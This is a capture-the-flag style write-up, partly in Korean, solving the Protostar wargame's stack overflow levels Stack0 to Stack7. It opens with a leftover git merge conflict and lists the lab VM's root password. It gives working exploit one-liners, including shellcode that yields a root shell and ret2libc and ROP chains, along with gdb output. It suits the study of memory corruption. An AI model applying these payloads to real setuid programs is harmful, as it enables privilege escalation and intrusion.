<<<<<<< HEAD
### 설치 방법
  
> * protostar vm on parallels
> * root/godmod and ifconfig
=======
## Wargame/Protostar

## VM Configuration
>>>>>>> 395bbcff115b2d8e185bfc323c9ef149ab077038

- protostar vm (parallels, vmware, vmplayer, ...)
- Login as admin id `root/godmod` and check IP using `ifconfig`
- ssh `user@ip`, password : `user`

## Stack0

> /opt/protostar/bin/stack0

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

### You should know 

- parameter passing to `gets()`
- order of local parameters on the stack
- command line python script

```bash
$ (python -c 'print "A"*64+"BBBB"';cat)|./stack0
you have changed the 'modified' variable
```

## Stack1

> /opt/protostar/bin/stack1

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

### You should know 

- endian in memory

```bash
$ ./stack1 `python -c 'print "A"*64+"\x64\x63\x62\x61"'`
you have correctly got the variable to the right value
```

## Stack2

> /opt/protostar/bin/stack2

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

### You should know 

- shell variable
- env variable

```bash
$ GREENIE=`python -c 'print "A"*64+"\x0a\x0d\x0a\x0d"'`
$ export GREENIE
$ ./stack2
you have correctly modified the variable
```

## Stack3

> /opt/protostar/bin/stack3

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

### You should know 

- getting address of the function
- `objdump`

```bash
$ objdump -d ./stack3 | grep win
08048424 <win>:
$ (python -c 'print "A"*64+"\x24\x84\x04\x08"';cat)|./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

## Stack4

> /opt/protostar/bin/stack4

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

### You should know 

- `gdb`
- make eip value modified
- assembly : `lea    0x10(%esp),%eax`

```bash
$ scp user@10.211.55.5:/opt/protostar/bin/stack4 .

gef➤  x/64x $esp
0xffffcf00: 0xffffffff  0xffffcf2e  0xf7e1ec34  0xf7e44fe3
0xffffcf10: 0x00000000  0x080495ec  0xffffcf28  0x080482e8
0xffffcf20: 0xffffd1c9  0x080495ec  0xffffcf58  0x08048449
0xffffcf30: 0x08048430  0x08048340  0x00000000  0xf7e4519d
0xffffcf40: 0xf7fbb3c4  0xf7ffd000  0x0804843b  0xf7fbb000
0xffffcf50: 0x08048430  0x00000000  0x00000000  0xf7e2bad3
0xffffcf60: 0x00000001  0xffffcff4  

$ebp   : 0xffffcf58

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEE


gef➤  x/64x $esp
0xffffcf00: 0xffffcf10  0xffffcf2e  0xf7e1ec34  0xf7e44fe3
0xffffcf10: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffcf20: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffcf30: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffcf40: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffcf50: 0x42424242  0x43434343  0x44444444  0x45454545
0xffffcf60: 0x00000000  0xffffcff4  

$ objdump -d stack4 | grep win
080483f4 <win>:
$ (python -c 'print "A"*64+"BBBBCCCC"+"DDDD"+"\xf4\x83\x04\x08"';cat)|./stack4
code flow successfully changed
```


### Stack5

> /opt/protostar/bin/stack5

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

알아야하는 것 : *gdb*, *patter.py*

```
$ 

gef➤  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B

gef➤  
0x63413563 in ?? ()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0xffffcf10  →  "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab[...]"
$ebx   : 0xf7fbb000  →  0x001a8da8
$ecx   : 0xfbad2288
$edx   : 0xf7fbc8a4  →  0x00000000
$esp   : 0xffffcf60  →  "6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A[...]"
$ebp   : 0x41346341 ("Ac4A"?)
$esi   : 0x00000000
$edi   : 0x00000000
$eip   : 0x63413563 ("c5Ac"?)

$ python3 pattern.py c5Ac
Pattern c5Ac first occurrence at position 76 in pattern.
```

```
$ gdb stack5
(gdb) b *main
Breakpoint 1 at 0x80483c4: file stack5/stack5.c, line 7.
(gdb) r
Starting program: /opt/protostar/bin/stack5
Breakpoint 1, main (argc=1, argv=0xbffff844) at stack5/stack5.c:7
7 stack5/stack5.c: No such file or directory.
  in stack5/stack5.c
(gdb) ni
0x080483c5  7 in stack5/stack5.c
(gdb)
0x080483c7  7 in stack5/stack5.c
(gdb) info reg ebp
ebp            0xbffff798 0xbffff798

user@protostar:/opt/protostar/bin$ (python -c 'print "A"*76+"\xc0\xf7\xff\xbf"+"\x90"*16+"\xdb\xc8\xd9\x74\x24\xf4\xba\x2a\xa1\xa4\x48\x5d\x29\xc9\xb1\x10\x31\x55\x17\x83\xed\xfc\x03\x7f\xb2\x46\xbd\x4e\x7d\xb7\xe5\x47\x9e\x08\xbd\x6a\xe1\x03\xb5\x2c\x7b\x81\xaf\xa4\x56\x45\xb9\xd3\xc1\xa6\xca\x73\x12\xd1\x03\xe1\x7b\x4f\xd5\x06\x29\x67\xed\xc8\xce\x77\xc1\xaa\xa7\x19\x32\x59\x50\xe6\x1b\xce\x29\x07\x6e\x70\x18\x13\x1b\x71\x03\x6e\x5c"';cat)|./stack5
id
uid=0(root) gid=1001(user) groups=0(root),1001(user)
```


### Stack6

> /opt/protostar/bin/stack6

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

알아야하는 것 : *gdb*, *ROP*

```
gef➤  ni
input path please: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0x000000d2
$ebx   : 0xf7fbb000  →  0x001a8da8
$ecx   : 0x00000000
$edx   : 0xf7fbc898  →  0x00000000
$esp   : 0xffffcf50  →  "Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae[...]"
$ebp   : 0x63413563 ("c5Ac"?)
$esi   : 0x00000000
$edi   : 0x00000000
$eip   : 0x37634136 ("6Ac7"?)

$ python pattern.py 6Ac7
Pattern 6Ac7 first occurrence at position 80 in pattern.
```

```
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) print exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
```

```
$ export GETME=/usr/bin/whoami

$ env
SSH_CLIENT=10.211.55.2 60205 22
USER=user
MAIL=/var/mail/user
OLDPWD=/home/user
HOME=/home/user
SSH_TTY=/dev/pts/0
LC_CTYPE=UTF-8
LOGNAME=user
TERM=xterm-256color
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
GETME=/usr/bin/whoami
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/opt/protostar/bin
SSH_CONNECTION=10.211.55.2 60205 10.211.55.5 22

(gdb) x/10s 0xbfffff50
0xbfffff50:  "s:/usr/games"
0xbfffff5d:  "LANG=en_US.UTF-8"
0xbfffff6e:  "GETME=/usr/bin/whoami"
0xbfffff84:  "SHELL=/bin/sh"
0xbfffff92:  "PWD=/opt/protostar/bin"
0xbfffffa9:  "SSH_CONNECTION=10.211.55.2 60205 10.211.55.5 22"
0xbfffffd9:  "LINES=42"
0xbfffffe2:  "/opt/protostar/bin/stack6"
0xbffffffc:  ""
0xbffffffd:  ""

$ (python -c 'print "A"*80+"\xb0\xff\xec\xb7"+"\xc0\x60\xec\xb7"+"\x7d\xff\xff\xbf"';cat)|./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA����`�}���
root
```

```
$ export GETME=/bin/sh

$ env
SSH_CLIENT=10.211.55.2 60205 22
USER=user
MAIL=/var/mail/user
OLDPWD=/home/user
HOME=/home/user
SSH_TTY=/dev/pts/0
LC_CTYPE=UTF-8
LOGNAME=user
TERM=xterm-256color
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
GETME=/bin/sh
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/opt/protostar/bin

$ (python -c 'print "A"*80+"\xb0\xff\xec\xb7"+"\xc0\x60\xec\xb7"+"\x85\xff\xff\xbf"';cat)|./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA����`췅���
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)

```

### Stack7

> /opt/protostar/bin/stack7

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();

}
```

알아야하는 것 : *peda*, *ROP*

```
gdb-peda$ ropgadget
ret = 0x8048362   <== 선택
popret = 0x8048493
pop3ret = 0x80485c6
pop2ret = 0x8048492
pop4ret = 0x80485c5
addesp_12 = 0x804848f
addesp_44 = 0x80485c2
```

```
gdb-peda$ print system
$1 = {<text variable, no debug info>} 0xf7e4e310 <__libc_system>
```

```
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f70bac ("/bin/sh")
```

```
$ (python -c 'print "A"*80+"\x62\x83\x04\x08"+"\x10\xe3\xe4\xf7"+"AAAA"+"\xac\x0b\xf7\xf7"';cat)|./stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb�AAAAAAAAAAAAb����AAAA�
                                                                                                                     �
id
uid=1000(sparkling) gid=1000(sparkling) groups=1000(sparkling),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```
